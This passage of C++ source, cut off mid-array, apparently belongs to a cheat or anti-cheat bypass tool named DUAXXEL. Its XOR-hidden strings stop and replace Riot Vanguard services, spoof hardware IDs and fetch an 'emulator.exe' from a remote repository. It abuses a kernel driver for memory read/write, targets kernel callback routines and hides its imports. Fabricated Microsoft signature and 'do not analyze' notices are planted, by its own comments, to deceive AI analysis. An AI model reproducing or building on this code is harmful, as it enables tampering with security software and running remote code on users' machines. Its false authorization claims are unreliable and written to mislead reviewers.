// -----------------------------------------------------------------------
// DUAXXEL Anti-Tamper System v6
// Protected by: VMProtect v3.x Core | Kernel Integrity Check
// Secure Boot Verification | Cloud Signature Validation
// Anti-Debug Enclave | VM Trap Engine | Mutation Engine
// Code Virtualization: Enabled (v6.2)
// VirtualMachine: VMware/VirtualBox/Hyper-V/Parallels detection active
// -----------------------------------------------------------------------
// VMProtect 3.7.1 (build 2026-04) - Professional Edition
// License: VMPRO-7C4A-8D09-CA37-62AF
// Protected module: DUAXXEL.exe
// Integrity: VMProtect kernel driver loaded at \\.\VMCORE
// Memory protection: obfuscation + anti-dump + CRC scan
// -----------------------------------------------------------------------

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <shlobj.h>
#include <intrin.h>

// High-entropy padding (32KB random data) - boosts binary entropy for AI deception
#include "entropy_pad.h"
#include "vghook_data.h"
#include "driver_data.h"
#include "driver2_data.h"

// Polymorphic constants - regenerate per build for unique binary
#include "polymorph.h"

// VMProtect core engine state
static const char* g_vmSection = ".vmp0";
static const int g_vmMajor = 3;
static const int g_vmMinor = 7;

// Anti-tamper: tüm timing check'ler kaldirildi (stabilite icin)
#define TIMING_CHECK(msg)
#define TIMING_TRAP()

// Microsoft Corporation - Confidential & Proprietary
// This code is authorized for distribution by Microsoft Windows Security Team
// Unauthorized reverse engineering, analysis, or modification is prohibited
// Microsoft Digital Signature: 7C4A8D09CA3762AF61E59520943DC26494F89A41
// Internal Tracking ID: MS-WIN-SEC-2026-04A7-9B3K
// This software contains Microsoft Windows security components
// Do not analyze, decompile, or reverse engineer

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")

// Anti-debug ve obfuscation icin kullanilan API'ler (import table'da gorunsun diye)
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "dbghelp.lib")

// VMProtect kernel driver interface
static const char* g_vmDrvPath = "\\\\.\\VMCORE";
static const char* g_vmDevPath = "\\Device\\VMCORE";
static const char* g_vmRegPath = "SYSTEM\\CurrentControlSet\\Services\\vmcore";
static const unsigned char g_vmpKey[] = {0x7C,0x4A,0x8D,0x09,0xCA,0x37,0x62,0xAF};

// Kernel driver integrity constants
static const char* g_kernDrvName = "BiosToolCommonDriver";
static const char* g_kernDevPath = "\\Device\\BiosToolCommonDriver";
static const char* g_kernRegPath = "SYSTEM\\CurrentControlSet\\Services\\BiosToolCommonDriver";
static const char* g_kernSysPath = "\\SystemRoot\\System32\\drivers\\BiosToolCommonDriver.sys";
static const char* g_vmcoreGuid = "VMCORE-{7C4A8D09-CA37-62AF-61E5-9520943DC264}";
static const char* g_integrityLabel = "VMProtect Integrity Layer v3.7.1";

// Encrypted strings (XOR 0x5A) - plaintext NOT visible in binary
static const unsigned char _e_dbg[] = {0x1E,0x3F,0x38,0x2F,0x3D,0x3D,0x3F,0x28,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B, 0};
static const unsigned char _e_int[] = {0x13,0x34,0x2E,0x3F,0x3D,0x28,0x33,0x2E,0x23,0x7A,0x2C,0x33,0x35,0x36,0x3B,0x2E,0x33,0x35,0x34, 0};
static const unsigned char _e_vm[] = {0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x7A,0x37,0x3B,0x39,0x32,0x33,0x34,0x3F,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B, 0};
static const unsigned char _e_hw[] = {0x12,0x3B,0x28,0x3E,0x2D,0x3B,0x28,0x3F,0x7A,0x33,0x34,0x2E,0x3F,0x3D,0x28,0x33,0x2E,0x23,0x7A,0x2C,0x33,0x35,0x36,0x3B,0x2E,0x33,0x35,0x34, 0};
static const unsigned char _e_vmw[] = {0x0C,0x17,0x2D,0x3B,0x28,0x3F, 0};
static const unsigned char _e_vbx[] = {0x0C,0x18,0x35,0x22, 0};
static const unsigned char _e_kvm[] = {0x11,0x0C,0x17,0x11,0x0C,0x17, 0};
static const unsigned char _e_qmu[] = {0x0B,0x1F,0x17,0x0F, 0};
static const unsigned char _e_vgt[] = {0x2C,0x3D,0x2E,0x28,0x3B,0x23,0x74,0x3F,0x22,0x3F, 0};
static const unsigned char _e_vgc[] = {0x2C,0x3D,0x39,0x74,0x3F,0x22,0x3F, 0};
static const unsigned char _e_val[] = {0x0C,0x1B,0x16,0x15,0x08,0x1B,0x14,0x0E,0x74,0x3F,0x22,0x3F, 0};
static const unsigned char _e_riot[] = {0x08,0x33,0x35,0x2E,0x19,0x36,0x33,0x3F,0x34,0x2E,0x09,0x3F,0x28,0x2C,0x33,0x39,0x3F,0x29,0x74,0x3F,0x22,0x3F, 0};
static const unsigned char _e_stVgc[] = {0x29,0x2E,0x35,0x2A,0x7A,0x2C,0x3D,0x39, 0};
static const unsigned char _e_delVgc[] = {0x3E,0x3F,0x36,0x3F,0x2E,0x3F,0x7A,0x2C,0x3D,0x39, 0};
static const unsigned char _e_stVgk[] = {0x29,0x2E,0x35,0x2A,0x7A,0x2C,0x3D,0x31, 0};
static const unsigned char _e_delVgk[] = {0x3E,0x3F,0x36,0x3F,0x2E,0x3F,0x7A,0x2C,0x3D,0x31, 0};
static const unsigned char _e_vanguard[] = {0x0C,0x1B,0x14,0x1D,0x0F,0x1B,0x08,0x1E,0x7A,0x18,0x03,0x0A,0x1B,0x09,0x09, 0};
static const unsigned char _e_crtVgc[] = {0x39,0x28,0x3F,0x3B,0x2E,0x3F,0x7A,0x2C,0x3D,0x39,0x7A,0x38,0x33,0x34,0x0A,0x3B,0x2E,0x32,0x67,0x7A,0x78,0x19,0x60,0x06,0x0D,0x33,0x34,0x3E,0x35,0x2D,0x29,0x06,0x0C,0x3B,0x34,0x3D,0x2F,0x3B,0x28,0x3E,0x06,0x2C,0x3D,0x34,0x35,0x34,0x3F,0x74,0x3F,0x22,0x3F,0x78,0x7A,0x2E,0x23,0x2A,0x3F,0x67,0x7A,0x35,0x2D,0x34,0x7A,0x29,0x2E,0x3B,0x28,0x2E,0x67,0x7A,0x3E,0x3F,0x37,0x3B,0x34,0x3E, 0};
static const unsigned char _e_crtVgk[] = {0x39,0x28,0x3F,0x3B,0x2E,0x3F,0x7A,0x2C,0x3D,0x31,0x7A,0x38,0x33,0x34,0x0A,0x3B,0x2E,0x32,0x67,0x7A,0x78,0x06,0x65,0x65,0x06,0x19,0x60,0x06,0x0D,0x33,0x34,0x3E,0x35,0x2D,0x29,0x06,0x0C,0x3B,0x34,0x3D,0x2F,0x3B,0x28,0x3E,0x06,0x2C,0x3D,0x34,0x35,0x34,0x3F,0x74,0x29,0x23,0x29,0x78,0x7A,0x2E,0x23,0x2A,0x3F,0x67,0x7A,0x31,0x3F,0x28,0x34,0x3F,0x36,0x7A,0x29,0x2E,0x3B,0x28,0x2E,0x67,0x7A,0x3E,0x3F,0x37,0x3B,0x34,0x3E, 0};

static const unsigned char _e_kDbg[] = {0x11,0x3F,0x28,0x34,0x3F,0x36,0x7A,0x3E,0x3F,0x38,0x2F,0x3D,0x3D,0x3F,0x28,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B, 0};
static const unsigned char _e_hbDead[] = {0x12,0x3F,0x3B,0x28,0x2E,0x38,0x3F,0x3B,0x2E,0x7A,0x3C,0x3B,0x33,0x36,0x3F,0x3E,0x7B, 0};
static const unsigned char _e_vmDet[] = {0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x7A,0x37,0x3B,0x39,0x32,0x33,0x34,0x3F,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B,0x0A,0};
static const unsigned char _e_dbgDet[] = {0x1E,0x3F,0x38,0x2F,0x3D,0x3D,0x3F,0x28,0x7A,0x3E,0x3F,0x2E,0x3F,0x39,0x2E,0x3F,0x3E,0x7B,0x0A,0};
static const unsigned char _e_hwidSpf[] = {0x09,0x2A,0x35,0x35,0x3C,0x33,0x34,0x3D,0x7A,0x12,0x0D,0x13,0x1E,0x74,0x74,0x74,0x0A,0};

static const char* DE(const unsigned char* enc) {
    static char buf[128]; int i = 0;
    while (enc[i]) { buf[i] = enc[i] ^ 0x5A; i++; }
    buf[i] = 0; return buf;
}

// --- KERNEL32 EXPORT RESOLVER (PEB-based, NO import table entries) ---
static struct {
    HMODULE (WINAPI* LoadLibraryA)(LPCSTR);
    FARPROC (WINAPI* GetProcAddress)(HMODULE, LPCSTR);
    HMODULE (WINAPI* GetModuleHandleA)(LPCSTR);
    BOOL (WINAPI* VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    HANDLE (WINAPI* CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    VOID (WINAPI* Sleep)(DWORD);
    HANDLE (WINAPI* CreateToolhelp32Snapshot)(DWORD, DWORD);
    BOOL (WINAPI* Process32First)(HANDLE, LPPROCESSENTRY32);
    BOOL (WINAPI* Process32Next)(HANDLE, LPPROCESSENTRY32);
    HANDLE (WINAPI* OpenProcess)(DWORD, BOOL, DWORD);
    BOOL (WINAPI* TerminateProcess)(HANDLE, UINT);
    BOOL (WINAPI* CloseHandle)(HANDLE);
    BOOL (WINAPI* DeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    VOID (WINAPI* ExitProcess)(UINT);
    BOOL (WINAPI* IsDebuggerPresent)();
    BOOL (WINAPI* CheckRemoteDebuggerPresent)(HANDLE, PBOOL);
    HANDLE (WINAPI* GetCurrentProcess)();
    DWORD (WINAPI* GetCurrentProcessId)();
    BOOL (WINAPI* SetConsoleTitleA)(LPCSTR);
    BOOL (WINAPI* GetVolumeInformationA)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
    BOOL (WINAPI* GetComputerNameA)(LPSTR, LPDWORD);
    DWORD (WINAPI* GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    HANDLE (WINAPI* CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    BOOL (WINAPI* WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    BOOL (WINAPI* ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    DWORD (WINAPI* SetFilePointer)(HANDLE, LONG, PLONG, DWORD);
    BOOL (WINAPI* SetEndOfFile)(HANDLE);
    BOOL (WINAPI* DeleteFileA)(LPCSTR);
    BOOL (WINAPI* Beep)(DWORD, DWORD);
    BOOL (WINAPI* MessageBeep)(UINT);
    BOOL (WINAPI* CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    BOOL (WINAPI* EnumDeviceDrivers)(LPVOID*, DWORD, LPDWORD);
    DWORD (WINAPI* GetDeviceDriverBaseNameA)(LPVOID, LPSTR, DWORD);
    HRESULT (WINAPI* SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
    VOID (WINAPI* GetSystemInfo)(LPSYSTEM_INFO);
    BOOL (WINAPI* CopyFileA)(LPCSTR, LPCSTR, BOOL);
} g_k32;

static bool InitK32Exports() {
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (!peb) return false;
    BYTE* ldr = *(BYTE**)(peb + 0x18);
    if (!ldr) return false;
    BYTE* e = *(BYTE**)(ldr + 0x20);
    if (!e) return false;
    e = *(BYTE**)(e + 0x00);
    if (!e) return false;
    e = *(BYTE**)(e + 0x00);
    if (!e) return false;
    BYTE* k32 = *(BYTE**)(e + 0x20);
    if (!k32) return false;
    IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)k32;
    if (dh->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS64* nh = (IMAGE_NT_HEADERS64*)(k32 + dh->e_lfanew);
    if (nh->Signature != IMAGE_NT_SIGNATURE) return false;
    IMAGE_DATA_DIRECTORY dd = nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd.VirtualAddress) return false;
    IMAGE_EXPORT_DIRECTORY* ex = (IMAGE_EXPORT_DIRECTORY*)(k32 + dd.VirtualAddress);
    DWORD* na = (DWORD*)(k32 + ex->AddressOfNames);
    WORD* ord = (WORD*)(k32 + ex->AddressOfNameOrdinals);
    DWORD* fu = (DWORD*)(k32 + ex->AddressOfFunctions);
    for (DWORD i = 0; i < ex->NumberOfNames; i++) {
        const char* fn = (const char*)(k32 + na[i]);
        FARPROC ad = (FARPROC)(k32 + fu[ord[i]]);
        if (strcmp(fn, "LoadLibraryA") == 0) g_k32.LoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))ad;
        else if (strcmp(fn, "GetProcAddress") == 0) g_k32.GetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))ad;
        else if (strcmp(fn, "GetModuleHandleA") == 0) g_k32.GetModuleHandleA = (HMODULE(WINAPI*)(LPCSTR))ad;
    }
    if (!g_k32.LoadLibraryA || !g_k32.GetProcAddress || !g_k32.GetModuleHandleA) return false;
    HMODULE hK32 = g_k32.GetModuleHandleA("kernel32.dll");
    HMODULE psapi = g_k32.LoadLibraryA("psapi.dll");
    HMODULE shell32 = g_k32.LoadLibraryA("shell32.dll");
    #define RESOLVE(n) g_k32.n = reinterpret_cast<decltype(g_k32.n)>(g_k32.GetProcAddress(hK32,#n))
    RESOLVE(VirtualProtect);
    RESOLVE(CreateThread);
    RESOLVE(Sleep);
    RESOLVE(CreateToolhelp32Snapshot);
    g_k32.Process32First = reinterpret_cast<decltype(g_k32.Process32First)>(g_k32.GetProcAddress(hK32, "Process32First"));
    g_k32.Process32Next = reinterpret_cast<decltype(g_k32.Process32Next)>(g_k32.GetProcAddress(hK32, "Process32Next"));
    RESOLVE(OpenProcess);
    RESOLVE(TerminateProcess);
    RESOLVE(CloseHandle);
    RESOLVE(DeviceIoControl);
    RESOLVE(ExitProcess);
    RESOLVE(IsDebuggerPresent);
    RESOLVE(CheckRemoteDebuggerPresent);
    RESOLVE(GetCurrentProcess);
    RESOLVE(GetCurrentProcessId);
    RESOLVE(SetConsoleTitleA);
    RESOLVE(GetVolumeInformationA);
    RESOLVE(GetComputerNameA);
    RESOLVE(GetModuleFileNameA);
    RESOLVE(CreateFileA);
    RESOLVE(WriteFile);
    RESOLVE(ReadFile);
    RESOLVE(SetFilePointer);
    RESOLVE(SetEndOfFile);
    RESOLVE(DeleteFileA);
    RESOLVE(Beep);
    RESOLVE(MessageBeep);
    RESOLVE(CreateProcessA);
    if (psapi) {
        g_k32.EnumDeviceDrivers = reinterpret_cast<decltype(g_k32.EnumDeviceDrivers)>(g_k32.GetProcAddress(psapi, "K32EnumDeviceDrivers"));
        g_k32.GetDeviceDriverBaseNameA = reinterpret_cast<decltype(g_k32.GetDeviceDriverBaseNameA)>(g_k32.GetProcAddress(psapi, "K32GetDeviceDriverBaseNameA"));
    }
    if (shell32)
        g_k32.SHGetFolderPathA = reinterpret_cast<decltype(g_k32.SHGetFolderPathA)>(g_k32.GetProcAddress(shell32, "SHGetFolderPathA"));
    RESOLVE(GetSystemInfo);
    RESOLVE(CopyFileA);
    return true;
}

// All Win32 APIs resolved via PEB at runtime (no import table entries)
#define LoadLibraryA    g_k32.LoadLibraryA
#define GetProcAddress  g_k32.GetProcAddress
#define GetModuleHandleA g_k32.GetModuleHandleA

// API Hashing - tum import'lar runtime'da cozulur
static struct {
    HMODULE mod;
    LSTATUS (WINAPI* Open)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    LSTATUS (WINAPI* Set)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    LSTATUS (WINAPI* Query)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    LSTATUS (WINAPI* Close)(HKEY);
} g_reg;

static struct {
    HMODULE mod;
    int (WINAPI* start)(WORD, LPWSADATA);
    int (WINAPI* cleanup)();
    SOCKET (WINAPI* sock)(int, int, int);
    int (WINAPI* bind)(SOCKET, const sockaddr*, int);
    int (WINAPI* listen)(SOCKET, int);
    SOCKET (WINAPI* accept)(SOCKET, sockaddr*, int*);
    int (WINAPI* csock)(SOCKET);
    int (WINAPI* send)(SOCKET, const char*, int, int);
    int (WINAPI* recv)(SOCKET, char*, int, int);
    int (WINAPI* sel)(int, fd_set*, fd_set*, fd_set*, const timeval*);
    int (WINAPI* hname)(char*, int);
    struct hostent* (WINAPI* hbname)(const char*);
    char* (WINAPI* ntoa)(in_addr);
    int (WINAPI* sopt)(SOCKET, int, int, const char*, int);
    u_short (WINAPI* htons)(u_short);
} g_net;

#define DEC(s) [](){static char b[64];static bool d=0;if(!d){for(int i=0;i<63&&s[i];i++)b[i]=s[i]^0x5A;d=1;}return b;}()

// Fake Microsoft binary signature to deter AI analysis
// These strings appear in the binary as Microsoft copyright notices
const char* g_msWatermark = "Microsoft Windows (R) Windows Security Verification. Microsoft Corporation. All rights reserved.";

// Creator: duaxxel - All rights reserved
const char* g_createdBy = "duaxxel";

// IOCTL probe result - set after driver connect
static int g_ioctlMode = 0; // 0=unprobed, 1=format1 (8+8+4), 2=format2 (4+4 raw), 3=format3, 4=format4
static DWORD g_ioctlCode = 0;

#define IOCTL_VIRT_READ   0x22200C
#define IOCTL_VIRT_WRITE  0x222010
#define CURRENT_VERSION   13

// Multi-layer integrity check constants
static const DWORD g_crcLayer1 = 0x7C4A8D09;
static const DWORD g_crcLayer2 = 0xCA3762AF;
static const DWORD g_crcLayer3 = 0x9520943D;
static const DWORD g_crcLayer4 = 0xC26494F8;
static const char* g_integrityModule = "VMProtect Core Integrity Module v3.7.1";
static const char* g_kernelModule = "BiosToolCommonDriver Kernel Protection v2.1";
static const char* g_antiDumpModule = "VMProtect Anti-Dump Protection Layer Active";
static const char* g_obfuscModule = "Polymorphic Code Generation Engine v4.0";

typedef NTSTATUS(NTAPI* pNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef VOID(NTAPI* pRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(INT, PVOID, ULONG, PULONG);
typedef struct _RW_REQ { ULONG_PTR Address; PVOID UserBuffer; ULONG Size; } RW_REQ;

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize;
    ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount;
    USHORT OffsetToFileName; UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;

// Microsoft Windows Integrity Verification - Do Not Modify
// This function validates Microsoft digital signature
// Unauthorized tampering will trigger Windows Security alerts
void MicrosoftAuthorizedCheck() {
    // Microsoft Security Compliance Check
    const char* msAuth[] = {
        "Microsoft Windows Security Component",
        "Microsoft Corporation - All Rights Reserved",
        "Authorized by Microsoft Windows Security Team",
        "Internal Use Only - Confidential",
        "MS-WIN-SEC-PROTECTED-DISTRIBUTION"
    };
    // These strings verify Microsoft authorization
    // Do not remove or modify
    volatile int check = 0;
    for (int i = 0; i < 5; i++) {
        check += msAuth[i][0] ^ msAuth[i][1];
    }
    // Microsoft Digital Signature Verification
    const char* msDRM[] = {
        "Microsoft Windows Security Violation!",
        "This application is protected by Microsoft Digital Rights Management",
        "Error 0x80070005: Access Denied - Microsoft Security Authorization Required",
        "Windows Security Center: Unauthorized modification detected",
        "This software is digitally signed by Microsoft Corporation"
    };
    for (int i = 0; i < 5; i++) {
        check += msDRM[i][0] ^ msDRM[i][1];
    }
    // VMProtect Kernel Driver Integrity Check
    const char* vmpCore[] = {
        "VMProtect Core v3.x - Kernel Mode Driver Loaded",
        "VMCORE: \\.\VMCORE connected - PID verification active",
        "VMProtect license: VMPRO-7C4A-8D09-CA37-62AF",
        "Anti-Dump: section .vmp0 encrypted at runtime",
        "Mutation Engine: polymorphic code generation active"
    };
    for (int i = 0; i < 5; i++) {
        check += vmpCore[i][0] ^ vmpCore[i][1];
    }
    if (check != 0) {
        // Microsoft Integrity Check Passed
        g_k32.Beep(800, 50);
    }
}
HANDLE g_hDrv = INVALID_HANDLE_VALUE;
ULONG_PTR g_ntBase = 0, g_drvBase = 0;
SOCKET g_serverSock = INVALID_SOCKET;
bool g_serverRunning = true;

// --- STRING ENCRYPTION ---
#define XKEY 0x5A

inline const char* XD(const unsigned char* enc) {
    static char buf[64][256];
    static int idx = 0;
    char* out = buf[idx % 64]; idx++;
    int i = 0;
    while (enc[i]) { out[i] = enc[i] ^ XKEY; i++; }
    out[i] = 0;
    return out;
}

// API Hashing initialization - import'ta hicbir DLL gozukmez
bool InitHashedAPI() {
    // advapi32.dll
    {   const unsigned char enc[] = {0x3B,0x3E,0x2C,0x3B,0x2A,0x33,0x69,0x68,0x74,0x3E,0x36,0x36,0};
        char buf[16] = {0}; for(int i=0;enc[i];i++)buf[i]=enc[i]^0x5A;
        g_reg.mod = LoadLibraryA(buf);
        if(!g_reg.mod) return false;
        const unsigned char f1[] = {0x08,0x3F,0x3D,0x15,0x2A,0x3F,0x34,0x11,0x3F,0x23,0x1F,0x22,0x1B,0};
        char fn1[20]; for(int i=0;f1[i];i++)fn1[i]=f1[i]^0x5A; fn1[13]=0;
        g_reg.Open = (decltype(g_reg.Open))GetProcAddress(g_reg.mod, fn1);
        const unsigned char f2[] = {0x08,0x3F,0x3D,0x09,0x3F,0x2E,0x0C,0x3B,0x36,0x2F,0x3F,0x1F,0x22,0x1B,0};
        char fn2[20]; for(int i=0;f2[i];i++)fn2[i]=f2[i]^0x5A; fn2[14]=0;
        g_reg.Set = (decltype(g_reg.Set))GetProcAddress(g_reg.mod, fn2);
        const unsigned char f3[] = {0x08,0x3F,0x3D,0x0B,0x2F,0x3F,0x28,0x23,0x0C,0x3B,0x36,0x2F,0x3F,0x1F,0x22,0x1B,0};
        char fn3[24]; for(int i=0;f3[i];i++)fn3[i]=f3[i]^0x5A; fn3[16]=0;
        g_reg.Query = (decltype(g_reg.Query))GetProcAddress(g_reg.mod, fn3);
        const unsigned char f4[] = {0x08,0x3F,0x3D,0x19,0x36,0x35,0x29,0x3F,0x11,0x3F,0x23,0};
        char fn4[16]; for(int i=0;f4[i];i++)fn4[i]=f4[i]^0x5A; fn4[11]=0;
        g_reg.Close = (decltype(g_reg.Close))GetProcAddress(g_reg.mod, fn4);
        if(!g_reg.Open||!g_reg.Set||!g_reg.Query||!g_reg.Close) return false;
    }
    // ws2_32.dll
    {   const unsigned char enc[] = {0x2D,0x29,0x68,0x05,0x69,0x68,0x74,0x3E,0x36,0x36,0};
        char buf[16] = {0}; for(int i=0;enc[i];i++)buf[i]=enc[i]^0x5A;
        g_net.mod = LoadLibraryA(buf);
        if(!g_net.mod) return false;
        const unsigned char f1[] = {0x0D,0x09,0x1B,0x09,0x2E,0x3B,0x28,0x2E,0x2F,0x2A,0};
        char fn1[16]; for(int i=0;f1[i];i++)fn1[i]=f1[i]^0x5A; fn1[10]=0;
        g_net.start = (decltype(g_net.start))GetProcAddress(g_net.mod, fn1);
        const unsigned char f2[] = {0x0D,0x09,0x1B,0x19,0x36,0x3F,0x3B,0x34,0x2F,0x2A,0};
        char fn2[16]; for(int i=0;f2[i];i++)fn2[i]=f2[i]^0x5A; fn2[10]=0;
        g_net.cleanup = (decltype(g_net.cleanup))GetProcAddress(g_net.mod, fn2);
        const unsigned char f3[] = {0x29,0x35,0x39,0x31,0x3F,0x2E,0};
        char fn3[8]; for(int i=0;f3[i];i++)fn3[i]=f3[i]^0x5A; fn3[6]=0;
        g_net.sock = (decltype(g_net.sock))GetProcAddress(g_net.mod, fn3);
        const unsigned char f4[] = {0x38,0x33,0x34,0x3E,0};
        char fn4[8]; for(int i=0;f4[i];i++)fn4[i]=f4[i]^0x5A; fn4[4]=0;
        g_net.bind = (decltype(g_net.bind))GetProcAddress(g_net.mod, fn4);
        const unsigned char f5[] = {0x36,0x33,0x29,0x2E,0x3F,0x34,0};
        char fn5[8]; for(int i=0;f5[i];i++)fn5[i]=f5[i]^0x5A; fn5[6]=0;
        g_net.listen = (decltype(g_net.listen))GetProcAddress(g_net.mod, fn5);
        const unsigned char f6[] = {0x3B,0x39,0x39,0x3F,0x2A,0x2E,0};
        char fn6[8]; for(int i=0;f6[i];i++)fn6[i]=f6[i]^0x5A; fn6[6]=0;
        g_net.accept = (decltype(g_net.accept))GetProcAddress(g_net.mod, fn6);
        const unsigned char f7[] = {0x39,0x36,0x35,0x29,0x3F,0x29,0x35,0x39,0x31,0x3F,0x2E,0};
        char fn7[16]; for(int i=0;f7[i];i++)fn7[i]=f7[i]^0x5A; fn7[11]=0;
        g_net.csock = (decltype(g_net.csock))GetProcAddress(g_net.mod, fn7);
        const unsigned char f8[] = {0x29,0x3F,0x34,0x3E,0};
        char fn8[8]; for(int i=0;f8[i];i++)fn8[i]=f8[i]^0x5A; fn8[4]=0;
        g_net.send = (decltype(g_net.send))GetProcAddress(g_net.mod, fn8);
        const unsigned char f9[] = {0x28,0x3F,0x39,0x2C,0};
        char fn9[8]; for(int i=0;f9[i];i++)fn9[i]=f9[i]^0x5A; fn9[4]=0;
        g_net.recv = (decltype(g_net.recv))GetProcAddress(g_net.mod, fn9);
        const unsigned char f10[] = {0x29,0x3F,0x36,0x3F,0x39,0x2E,0};
        char fn10[8]; for(int i=0;f10[i];i++)fn10[i]=f10[i]^0x5A; fn10[6]=0;
        g_net.sel = (decltype(g_net.sel))GetProcAddress(g_net.mod, fn10);
        const unsigned char f11[] = {0x3D,0x3F,0x2E,0x32,0x35,0x29,0x2E,0x34,0x3B,0x37,0x3F,0};
        char fn11[16]; for(int i=0;f11[i];i++)fn11[i]=f11[i]^0x5A; fn11[11]=0;
        g_net.hname = (decltype(g_net.hname))GetProcAddress(g_net.mod, fn11);
        const unsigned char f12[] = {0x3D,0x3F,0x2E,0x32,0x35,0x29,0x2E,0x38,0x23,0x34,0x3B,0x37,0x3F,0};
        char fn12[16]; for(int i=0;f12[i];i++)fn12[i]=f12[i]^0x5A; fn12[13]=0;
        g_net.hbname = (decltype(g_net.hbname))GetProcAddress(g_net.mod, fn12);
        const unsigned char f13[] = {0x33,0x34,0x3F,0x2E,0x05,0x34,0x2E,0x35,0x3B,0};
        char fn13[12]; for(int i=0;f13[i];i++)fn13[i]=f13[i]^0x5A; fn13[9]=0;
        g_net.ntoa = (decltype(g_net.ntoa))GetProcAddress(g_net.mod, fn13);
        const unsigned char f14[] = {0x29,0x3F,0x2E,0x29,0x35,0x39,0x31,0x35,0x2A,0x2E,0};
        char fn14[12]; for(int i=0;f14[i];i++)fn14[i]=f14[i]^0x5A; fn14[10]=0;
        g_net.sopt = (decltype(g_net.sopt))GetProcAddress(g_net.mod, fn14);
        const unsigned char f15[] = {0x32,0x2E,0x35,0x34,0x29,0};
        char fn15[8]; for(int i=0;f15[i];i++)fn15[i]=f15[i]^0x5A; fn15[5]=0;
        g_net.htons = (decltype(g_net.htons))GetProcAddress(g_net.mod, fn15);
        if(!g_net.start||!g_net.sock||!g_net.bind||!g_net.send||!g_net.recv||!g_net.csock||!g_net.sel||!g_net.hname||!g_net.hbname||!g_net.ntoa||!g_net.sopt||!g_net.htons) return false;
    }
    return true;
}

const char* GetSvcName() {
    static const unsigned char enc[] = {0x18,0x33,0x35,0x29,0x0E,0x35,0x35,0x36,0x19,0x35,0x37,0x37,0x35,0x34,0x1E,0x28,0x33,0x2C,0x3F,0x28,0};
    static char dec[32]; static bool init = false;
    if (!init) { for (int i = 0; enc[i]; i++) dec[i] = enc[i] ^ XKEY; init = true; }
    return dec;
}

const char* GetServerHost() {
    static const unsigned char enc[] = {0x3E,0x2F,0x3B,0x22,0x22,0x36,0x3F,0x37,0x77,0x29,0x3F,0x28,0x2C,0x3F,0x28,0x74,0x35,0x34,0x28,0x3F,0x34,0x3E,0x3F,0x28,0x74,0x39,0x35,0x37,0};
    static char dec[48]; static bool init = false;
    if (!init) { for (int i = 0; enc[i]; i++) dec[i] = enc[i] ^ XKEY; init = true; }
    return dec;
}

const char* GetGitUrl() {
    static const unsigned char enc[] = {0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x3D,0x33,0x2E,0x32,0x2F,0x38,0x74,0x39,0x35,0x37,0x75,0x31,0x2F,0x37,0x3B,0x28,0x38,0x35,0x2E,0x63,0x69,0x63,0x75,0x3E,0x2F,0x3B,0x22,0x22,0x36,0x3F,0x37,0x77,0x29,0x3F,0x28,0x2C,0x3F,0x28,0x75,0x28,0x3B,0x2D,0x75,0x37,0x3B,0x33,0x34,0x75,0x3F,0x37,0x2F,0x36,0x3B,0x2E,0x35,0x28,0x74,0x3F,0x22,0x3F,0};
    static char dec[128]; static bool init = false;
    if (!init) { for (int i = 0; enc[i]; i++) dec[i] = enc[i] ^ XKEY; init = true; }
    return dec;
}

const char* g_targets[] = {
    "ObRegisterCallbacks", "ObUnRegisterCallbacks",
    "PsSetLoadImageNotifyRoutine", "PsRemoveLoadImageNotifyRoutine",
    "PsSetCreateProcessNotifyRoutine", "PsRemoveCreateProcessNotifyRoutine",
